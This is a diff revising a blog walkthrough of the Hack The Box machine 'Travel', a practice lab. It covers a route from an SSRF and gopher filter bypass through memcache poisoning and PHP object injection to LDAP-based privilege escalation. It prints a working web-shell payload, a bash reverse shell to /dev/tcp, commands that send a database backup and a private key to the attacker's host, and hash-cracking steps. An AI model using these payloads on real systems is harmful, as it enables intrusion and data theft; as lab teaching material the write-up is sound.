@@ -1,11 +1,14 @@
 ---
 title: "Travel Walkthrough(Hack The Box)"
-date: 2025-03-20
+date: 2025-03-23
 draft: true
 description: "A straight forward walkthrough of the box Travel from Hack The Box"
 tags: ["Hard", "Linux", "Hack The Box", "Hacking", "Web", "Walkthrough"]
 ---
-## Reconnaissance & Enumeration #Linux 
+## About 
+ Travel is a hard difficulty Linux machine that features a WordPress instance along with a development server. The server is found to host an exposed Git repository, which reveals sensitive source code. The source code is analyzed and an SSRF and unsafe deserialization vulnerability are identified. These are leveraged to gain code execution. A backup password is cracked and used to move laterally. The user is found to be an LDAP administrator and can edit user attributes. This is leveraged to modify group membership and gain root privileges.
+
+## Reconnaissance & Enumeration 
 - Nmap scan results:
 ```
 PORT    STATE SERVICE  VERSION
@@ -61,17 +64,18 @@ HOP RTT       ADDRESS
 
 ```
 - Surprisingly there are three ports open with 433 being the unusal .
-- I can see the domain names from the nmap scan.
-- There were some interesting information that I stumbled upon while on the reconnaissance process
-	- I learnt about `hello@travel.htb` from the home page of port 80
-	- There were some pretty good filter on the `email` subscribe field
-	- ![[Pasted image 20250227175233.png]]
-	- I found this j-query page, So I thought there could be api endpoints but there wasn't
-	- ![[Pasted image 20250227175402.png]]
-- On port 443 got this 
-- ![[Pasted image 20250227175537.png]]
-- `blog.travel.htb` had a pretty good page and it made of wordpress.
-- ![[Pasted image 20250227180045.png]]
+- Nmap scan reveals the domain names/Host names.
+- There are some interesting information that I stumbled upon while on the reconnaissance process
+	> I learnt about `hello@travel.htb` from the home page of port 80
+	> There is some pretty good filter on the `email` subscribe field
+ ![Pasted image 20250227175233.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227175233.png?raw=true)
+	> I found this j-query page, So I thought there could be api endpoints but there wasn't any
+![Pasted image 20250227175402.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227175402.png?raw=true)
+- From port 443 I got these juicy information 
+![Pasted image 20250227175537.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227175537.png?raw=true)
+- `blog.travel.htb` had a pretty good page and it's made of wordpress.
+![info](https://media1.tenor.com/m/bKIiOYYbu-kAAAAd/reaction.gif)
+![Pasted image 20250227180045.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227180045.png?raw=true)
 - I ran `wpscan` against this website and found some interesting stuffs
 ```
 Interesting Finding(s):
@@ -136,10 +140,11 @@ Interesting Finding(s):
  |  - http://blog.travel.htb/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'
 
 ```
-- But there were nothing useful
-- When I try to access `blog-dev.travel.htb` I get `403` but If I fuzz the URL I can see exposed `.git` 
-- From the `git` dump I can see three files `README.md`,`rss_template.php`,`template.php` respectively
-- The file `README.md` exposed some information by exposing this content
+- But there was nothing useful
+- When I try to access `blog-dev.travel.htb` I get `403` but If I fuzz for directories I can see a exposed `.git` directory. 
+- Quickly I used `git-dumper` tool and from the dump I can see three files `README.md`,`rss_template.php`,`template.php` respectively
+- The file `README.md` exposed some information
+
 ```
 # Rss Template Extension
 
@@ -278,8 +283,14 @@ if (isset($_GET['debug'])){
 <?php
 get_footer();
 ```
+### Understanding Awesome RSS
 - `rss_template.php` is the source code for `Awesome RSS` which is from the web page `blog.travel.htb`
-- This following code uses `memcache` for caching and the format is with `xct_` as prefix to the cached data.
+- This following code uses `memcache` for caching and with `xct_` as prefix to the cached data.
+
+{{< badge >}} Definition {{< /badge >}}
+ Memcache module provides handy procedural and object-oriented interface to memcached, highly effective caching daemon, which was especially designed to decrease database load in dynamic web applications. The Memcache module also provides a session handler (memcache).
+More information about memcached can be found at » http://www.memcached.org/. 
+
 ```php
      if ($url) {
          $simplepie = new SimplePie();
@@ -296,8 +307,8 @@ get_footer();
  	 }
  	 $feed = get_feed($url); 
 ```
-- `customefeed.xml` has the data in `xml` format, and the contents mach `Awesome RSS`
-- ![[Pasted image 20250227222045.png]]
+- `customefeed.xml` has the data in `xml` format, and the contents match `Awesome RSS`
+![Pasted image 20250227222045.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227222045.png?raw=true)
 - Again this code function requests query string `custom_feed_url` for `customfeed.xml`
 ```php
  	$url = $_SERVER['QUERY_STRING'];
@@ -310,16 +321,16 @@ get_footer();
 
 ```
 
-- If the condition satisfies then it splits the URL with `'='` with `explode` like this `awesome-rss/?custom_feed_url=QUERY_STRING`. Else it will simply sets the `url` to `http://www.travel.htb/newsfeed/customfeed.xml`
-- So we can make the URL to look like this:
+- If the condition satisfies then it splits the URL by `'='` with using [explode](https://www.w3schools.com/php/func_string_explode.asp) function like this `awesome-rss/?custom_feed_url=QUERY_STRING`. Else it will simply sets the `url` to `http://www.travel.htb/newsfeed/customfeed.xml`
+- So let's test this by making the URL to look like this:
 ```
 http://blog.travel.htb/awesome-rss?custom_feed_url&rss=http://10.10.14.16/rss
 ```
-- Sent a curl request with this URL
-- ![[Pasted image 20250227224728.png]]
-- Got a hit on my listener 
-- ![[Pasted image 20250227224801.png]]
-- At end of the source code we can see code for `debug` page. But It's within html comments
+- I opened a netcat like this `nc -lnvp 3888` listener and sent a curl request with the above URL
+![Pasted image 20250227224728.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227224728.png?raw=true)
+- Got a hit on my listener, I can see it in the logs. This confirms the SSRF vulnerability here
+![Pasted image 20250227224801.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227224801.png?raw=true)
+- At end of the source code I can see a code for `debug` page. But It's within the html comments
 ```html
 <!--
 DEBUG
@@ -330,19 +341,20 @@ if (isset($_GET['debug'])){
 ?>
 -->
 ```
-- There wan't any difference in visiting `debug` it just returns the same page 
-- ![[Pasted image 20250227225459.png]]
-- But from the source code we can see. At first it was empty on refreshing it showed the cached value
-- ![[Pasted image 20250227225753.png]]
-- We can do the same using curl
+- There isn't any difference, on visiting `debug.php` it just returns the same page 
+![Pasted image 20250227225459.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227225459.png?raw=true)
+- But from the source code I can see the contents. At first it was empty but on refreshing the page it showed me the cached value
+![Pasted image 20250227225753.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227225753.png?raw=true)
+- I can view the commented value using the `diff` command in my terminal
+
 ```bash
 diff <(curl -s 'http://blog.travel.htb/awesome-rss/?debug') <(curl -s http://blog.travel.htb/awesome-rss/)
 ```
 - First try
-	- ![[Pasted image 20250227225907.png]]
+	- ![Pasted image 20250227225907.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227225907.png?raw=true)
 - Second try
-	- ![[Pasted image 20250227225941.png]]
-- This was the contents from `template.php` 
+	- ![Pasted image 20250227225941.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250227225941.png?raw=true)
+- This is the content from `template.php` 
 ```php
 <?php
 
@@ -405,65 +417,76 @@ class TemplateHelper
 }
 
 ```
-- `template.php` mainly had the code for security mechanisms to `custom_feed_url` 
+- `template.php` primarily has the code for security mechanisms to secure `custom_feed_url` 
 - The code mainly checks for:
 	1. `file://` or  `@` ---> Local file Inclusion attacks
 	2. `-o` or `-F` ---> Command Injection
 	3. `localhost` or `127.0.0.1` ---> Server Side Request Forgery
-- If the above conditions satisfied then the PHP code exits and records attempts to `/logs/`
+- If the above conditions are satisfied then the PHP code exits and records attempts to `/logs/`
 - There is an workaround for this, I can use [Gopher](https://en.wikipedia.org/wiki/Gopher_(protocol)) protocol instead of http with decimal representation of local host.
-- Gopher is very old protocol used before http and delivers the message without any useless headers.
-- **Testing:**
-	- I can test gopher using this 
-```
+
+{{< badge >}} Definition {{< /badge >}}
+Gopher is a protocol. It was designed for distributing, searching, and retrieving documents over the Internet. Gopher represented an early alternative to the World Wide Web.
+The gopher protocol has some things HTTP-based clients do not have. It is based on menus. An item selected from a menu will either open another menu, or a document.
+
+- The bottom line is, Gopher is a very old protocol that used before http and delivers the message without any useless headers.
+
+### Testing with Gopher
+- I can test gopher like this 
+```bash
 curl -s 'gopher://10.10.14.16:6001//testing'
 ```
-- I can see that gopher successfully transfers the message without any headers
-- ![[Pasted image 20250228103856.png]]
-- Now I tested for the `memcache` , I saved a local copy of `customfeed.xml` as `sec.xml`
-- ![[Pasted image 20250228104112.png]]
-- I requested this file using SSRF 
-```
+- I can see that gopher successfully transfers the message without any Headers
+![Pasted image 20250228103856.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228103856.png?raw=true)
+- Now that I tested gopher for the `memcache` , I saved a local copy of `customfeed.xml` as `sec.xml`
+![Pasted image 20250228104112.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228104112.png?raw=true)
+- I opened a python http server and I requested for the file that I made, using SSRF that I discovered earlier 
+
+```bash
 curl -s http://blog.travel.htb/awesome-rss/\?custom_feed_url=http://10.10.14.16:8000/sec.xml
 ```
-- Actually It saved the file into it's caching. Now I can see two data 
-- ![[Pasted image 20250228104408.png]]
-- This definitely could be a hash generated.
-**Poisoning Memcache:**
-- Next I called for the local host using Gopher
+- Actually It saved the file that I made as some data into it's cache. Now I can see two data values 
+![Pasted image 20250228104408.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228104408.png?raw=true)
+- This definitely could be a hash generated value.
+
+### Understanding Memcache
+- Next I called for the local host using Gopher protocol
 - [Gopherus](https://github.com/tarunkant/Gopherus) is a tool that generates SSRF payloads using gopher protocol. 
-- For the texting I gave `exploitEmp5r0R` as a payload value
-- ![[Pasted image 20250228105632.png]]
-- Now I replace the localhost with it's decimal representation which is `2130706433` . Hex value is also applicable 
-- Now the payloads becomes
+- For testing I gave `exploitEmp5r0R` as a payload value
+![Pasted image 20250228105632.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228105632.png?raw=true)
+- As I already know about the filters for `custom_feed_url` to bypass the them I can replace the localhost with it's decimal representation which is `2130706433` . Hex value is also applicable 
+- Now the payload becomes
 ```
 http://blog.travel.htb/awesome-rss/\?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%2014%0d%0aexploitEmp5r0R%0d%0a
 ```
 - Sent it using curl
-```
+```bash
 curl -s http://blog.travel.htb/awesome-rss/\?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%2014%0d%0aexploitEmp5r0R%0d%0a
 ```
-- ![[Pasted image 20250228105938.png]]
-- With `debug` I can see that it worked
-- ![[Pasted image 20250228110046.png]]
-- As this is a MD5 generated we could also recreate it. This cache gets md5 hash for customfeed.xml as whole URL
-```
+![Pasted image 20250228105938.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228105938.png?raw=true)
+- With `debug` I can see that it actually worked
+![worked](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjVrYjEwM2p0NmV3bThudmZmbDNuejc4Mmt4czN1MGhydHo3MHMzbCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/o75ajIFH0QnQC3nCeD/giphy.gif)
+![Pasted image 20250228110046.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228110046.png?raw=true)
+- As this is a MD5 generated hash, I could also recreate it. This cache stores md5 hash of `customfeed.xml` with including the whole URL
+```bash
 echo -n "http://www.travel.htb/newsfeed/customfeed.xml" | md5sum
 ```
-- Like the above. Now the memcache get's another md5 sum for the output of above hash with key `spc`. I learnt about this while googling `memcache`. I could see the whole source code on the internet.
-- ![[Pasted image 20250228112509.png]]
-- Now lets make another with the key `spc`
-```
+- The `Memcached` get's md5 sum of something with using the key `spc`. I learnt about this while googling `memcache`. I could see the whole source code on the internet as `memcache` is opensource.
+![Pasted image 20250228112509.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228112509.png?raw=true)
+- Now lets make another with the new found key `spc`
+```bash
 echo -n "3903a76d1e6fef0d76e973a0561cbfc0:spc" | md5sum
 ```
-- ![[Pasted image 20250228112555.png]]
-- I can see the hash value matches to the value from debug
-- ![[Pasted image 20250228112654.png]]
+![Pasted image 20250228112555.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228112555.png?raw=true)
+- I can see this hash value matches to the value from debug
+![Pasted image 20250228112654.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228112654.png?raw=true)
  
 ## Exploitation
- **Creating Payload:**
- - I can generate the serialized object by tweaking `template.php` code a little by injecting a payload
- ```php
+
+- I can generate the serialized object by tweaking `template.php` code a little by injecting a malicious payload
+
+### Crafting the payload
+```php
  <?php
 class TemplateHelper
 {
@@ -485,17 +508,17 @@ echo serialize($pwn);
 ?>
 
 ```
-- This code will generate a serialized object for the malicious payload which will be saved as `shell.php` within the `logs` folder.
-- Actually running the php code locally we can see the process. But first let me create a directory called `logs`
-```
+- This code will generate a serialized object for the malicious payload which on using will be saved as `shell.php` within the `logs` folder.
+- Actually on running the php code locally I can watch the process. But first let me create a directory called `logs`
+```php
 php exploit.php
 ```
-- ![[Pasted image 20250228114813.png]]
-- I can see the payload too in my local system
-- ![[Pasted image 20250228114847.png]]
-- Now I fed the payload generated by our script to `gopherus`
-- ![[Pasted image 20250228114951.png]]
-- This was the output I got while doing that
+![Pasted image 20250228114813.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228114813.png?raw=true)
+- Now I can see the payload within the `logs` folder that I created
+![Pasted image 20250228114847.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228114847.png?raw=true)
+- Now I fed the serialized data generated by the php script to `gopherus`
+![Pasted image 20250228114951.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228114951.png?raw=true)
+- This was the output I got from `gopherus` tool
 ```
 gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20104%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:32:%22%3C%3Fphp%20system%28%24_GET%5Bemperor%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
 ```
@@ -507,63 +530,68 @@ gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20104%0d%0aO:14:%22Template
 http://blog.travel.htb/awesome-rss/\?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20104%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:32:%22%3C%3Fphp%20system%28%24_GET%5Bemperor%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
 ```
 -  Sent it using curl
-- ![[Pasted image 20250228115417.png]]
-- Now If I got to `http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?0=id` I can access the `shell.php`
-- Which worked very well
-- ![[Pasted image 20250228115554.png]]
+![Pasted image 20250228115417.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228115417.png?raw=true)
+- On visiting `http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?0=id` I could access `shell.php`
+- This worked very nicely
+![Pasted image 20250228115554.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228115554.png?raw=true)
 - To get a reverse shell lets change the `id` command with url encoded bash payload which would be
-```
+```bash
 bash%20%2Dc%20%27exec%20bash%20%2Di%20%26%3E%2Fdev%2Ftcp%2F10%2E10%2E14%2E16%2F6001%20%3C%261%27
 ```
 - The final **URL for reverse shell** would be
 ```
 http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?emperor=bash%20%2Dc%20%27exec%20bash%20%2Di%20%26%3E%2Fdev%2Ftcp%2F10%2E10%2E14%2E16%2F6001%20%3C%261%27
 ```
-- I got the reverse shell
+- I got the reverse shell connection on my listener
 - I performed some **shell up gradation** 
-```
+```bash
 /usr/bin/script -qc /bin/bash /dev/null
 ```
 - Then for `clear` command
-```
+```bash
 export TERM=xterm
 ```
 - Press **CTRL+Z**
 - Then after
-```
+```bash
 stty raw -echo; fg
 ```
 - Atlast
-```
+```bash
 stty rows 38 columns 116
 ```
-- ![[Pasted image 20250228120138.png]]
+![Pasted image 20250228120138.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228120138.png?raw=true)
+
 ## Pivoting
-- The directory `/opt/wordpress` has a `sql` database file
-- So transferred the file using this
-```
+- While enumerating I found the directory `/opt/wordpress` which had a `sql` database file
+- So I transferred the file like this to my netcat listener
+```bash
 cat backup-13-04-2020.sql > /dev/tcp/10.10.14.16/8001
 ```
 - If I search for `admin` using `grep` I can get two hashes
-- ![[Pasted image 20250228121321.png]]
-- Only one hash could be cracked. Hash for  user `lynik-admin` can be cracked
-```
+![Pasted image 20250228121321.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228121321.png?raw=true)
+- Only one hash could be cracked. Which is the hash for user `lynik-admin`
+```bash
 hashcat hashes /usr/share/wordlists/rockyou.txt
 ```
-- ![[Pasted image 20250228121920.png]]
-- We have ssh access for user `lynik-admin`
+![Pasted image 20250228121920.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228121920.png?raw=true)
+- Now I have ssh access for user `lynik-admin`
+- Got the {{< keyword >}} User flag {{< /keyword >}}
+- *Breaking the fourthwall* --> I can see what you are thinking
+![soon](https://media1.tenor.com/m/--JqR4L6UIIAAAAC/titanic-it%27ll-all-be-over-soon.gif)
+
 ## Privilege Escalation
 - In the home directory of `lynik-admin` , I can see a hidden file `.ldaprc`.
-- ![[Pasted image 20250228163300.png]]
+![Pasted image 20250228163300.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228163300.png?raw=true)
 - Which is particularly interesting, This [article](https://www.mkssoftware.com/docs/man5/ldap_config.5.asp) says that the file `ldaprc` holds the configuration for `LDAP` clients.
-- ![[Pasted image 20250228163610.png]]
+![Pasted image 20250228163610.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228163610.png?raw=true)
 - The file contents are:-
-	- ![[Pasted image 20250228163642.png]]
+![Pasted image 20250228163642.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228163642.png?raw=true)
 - I enumerated the domain with some basic commands 
-- ![[Pasted image 20250228163936.png]]
+![Pasted image 20250228163936.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228163936.png?raw=true)
 - There was another interesting file hidden within the home directory which is `.viminfo`
-- Basically `.viminfo` file will hold serialized data of modification done through vim editor.
-- ![[Pasted image 20250228164514.png]]
+- Basically `.viminfo` file will hold serialized data of any modifications done through vim editor.
+![Pasted image 20250228164514.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228164514.png?raw=true)
 - Contents of `.viminfo`:
 ```
 # This viminfo file was generated by Vim 8.1.
@@ -615,21 +643,21 @@ hashcat hashes /usr/share/wordlists/rockyou.txt
 
 ```
 - There was a word which looked like a password so I redacted that particular data and gave you the contents
-- Usually the #LDAP listens on port 389. We can do a quick bash scan to confirm it
-```
+- Usually the LDAP listens on port 389. We can do a quick bash scan to confirm that
+```bash
 for port in {1..65535}; do echo > /dev/tcp/172.20.0.10/$port && echo "$port open"; done 2>/dev/null
 ```
 - Actually there is another port open which is `639` along with `389`
 - First lemme forward the port 389 to my system.
-```
+```bash
 ssh -L 389:172.20.0.10:389 lynik-admin@travel.htb
 ```
-- The password from `.viminfo` actually works
-```
+- The password from `.viminfo` actually worked here
+```bash
 ldapsearch -H ldap://127.0.0.1  -w <SNIP> -b "DC=travel,DC=htb" -D 'CN=lynik-admin,DC=travel,dc=htb'
 ```
-- ![[Pasted image 20250228170736.png]]
-- This user actually is a admin to LDAP which will help a lot
+![Pasted image 20250228170736.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250228170736.png?raw=true)
+- This user actually a admin to LDAP which will help a lot
 - The PAM configuration for su reveals something. Location of the file: `/etc/pam.d/su`
 ```
 #
@@ -693,35 +721,43 @@ session    required   pam_limits.so
 @include common-session
 
 ```
+- Before moving onto next, make a LDAP connection with [Apache Directory Studio](https://directory.apache.org/studio/) to make any process easy
 - The configuration allows only the members of wheel group to switch to other users. Attempts to SSH as this user also fail, as the server denies password-based authentication.
-- The ssh configuration file also gives us more details regarding this. `/etc/ssh/ssh_config` and`/etc/ssh/sshd_config
-- The sss_ssh_authorizedkeys utility retrieves user public keys from the specified domain. According to the documentation, SSH public keys can be stored in the sshPublicKey attribute in LDAP
-- Lets try changing the password of user `lynik` to password of our choice
+- The ssh configuration file also gives us more details regarding this. (Ref: `/etc/ssh/ssh_config` and `/etc/ssh/sshd_config`)
+- The sss_ssh_authorizedkeys utility retrieves user public keys from the specified domain. According to the documentation, SSH public keys can be stored in the sshPublicKey attribute on LDAP
+- Lets try changing the password for user `lynik` to password of our choice
 - Click on new Attribute and type `userPassword` then click finish after that a dialogue box will prompt asking for new password. Enter the password, click finish.
-- ![[Pasted image 20250301003838.png]]
-- I can see the commands used for this, below.
-- ![[Pasted image 20250301003943.png]]
-- To login as user `lynik` I have to put the public key via LDAP
+![Pasted image 20250301003838.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301003838.png?raw=true)
+- I can see the commands used in the background for this, below.
+![Pasted image 20250301003943.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301003943.png?raw=true)
+- To login as user `lynik` I have to put the public key to the system via LDAP
 - Now to login using ssh I created keys using `ssh-keygen` and then copied the public key.
-- ![[Pasted image 20250301005213.png]]
+![Pasted image 20250301005213.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301005213.png?raw=true)
 - In Apache directory studio create new attribute `objectClass` and the click finish
 - Then on the prompt select `ldapPublickey`, click finish after selecting it.
-- Create another attribute `sshPublickey` then on the prompt click "edit as text", after paste the public key. Click finish.
+- Create another attribute `sshPublickey` then on the prompt click `"edit as text"`, after paste the public key. Click finish.
 - Transferred the private key to my system.
-```
+```bash
 cat id_rsa > /dev/tcp/10.10.14.16/8001
 ```
-- After giving necessary permissions, using that to login as user `lynik`
-- I can see user `lynik` group is `5000`
-- ![[Pasted image 20250301010405.png]]
-- I can actually change the group to root group. But first I have to find the UID for root group
-```
+- After giving all the necessary permissions, used the private key to login as user `lynik`
+- I can see user `lynik` group is in `5000`
+![Pasted image 20250301010405.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301010405.png?raw=true)
+- I can actually change the group to root's group. But first I have to find the UID for root group
+```bash
 cat /etc/group | grep -i sudo
 ```
-- ![[Pasted image 20250301010513.png]]
+![Pasted image 20250301010513.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301010513.png?raw=true)
 - Found root group to be `27` so changed the group ID to `27` in the LDAP.
-- ![[Pasted image 20250301010953.png]]
+![Pasted image 20250301010953.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301010953.png?raw=true)
 - After re-login I can see the changes
-- ![[Pasted image 20250301011035.png]]
-- Got the root flag.
-- ![[Pasted image 20250301011304.png]]
+![Pasted image 20250301011035.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301011035.png?raw=true)
+- Got the {{< keyword >}} Root flag {{< /keyword >}}
+![Pasted image 20250301011304.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250301011304.png?raw=true)
+
+## Summary
+This walkthrough details the full compromise of travel.htb, a Linux-based target. Reconnaissance revealed open ports (22, 80, 443), a WordPress site (blog.travel.htb), and an exposed .git directory. Enumeration uncovered an outdated WordPress 5.4 installation with XML-RPC enabled and a vulnerable rss_template.php file. Exploiting an SSRF vulnerability, cache poisoning in Memcached, and PHP object injection, a web shell was uploaded, leading to remote code execution. Pivoting further, a MySQL database dump exposed credentials, and an .ldaprc file hinted at LDAP-based authentication. Using .viminfo, a stored password was retrieved, granting access to lynik-admin via SSH. By modifying LDAP attributes, the user’s group was changed to root (27), escalating privileges and leading to complete system takeover. This successful attack leveraged SSRF, cache poisoning, and LDAP misconfigurations to achieve root access and capture the final flag.
+
+{{< typeit >}} I am not going to lie this one of the logest box that I have ever encountered. Apart from that this was good, This is machine geve me pure statisfaction. As always i'll see you on another walkthrough {{< /typeit >}}
+
+![see-you](https://media.tenor.com/EtD1uTCJ_3sAAAAi/no-bye.gif)
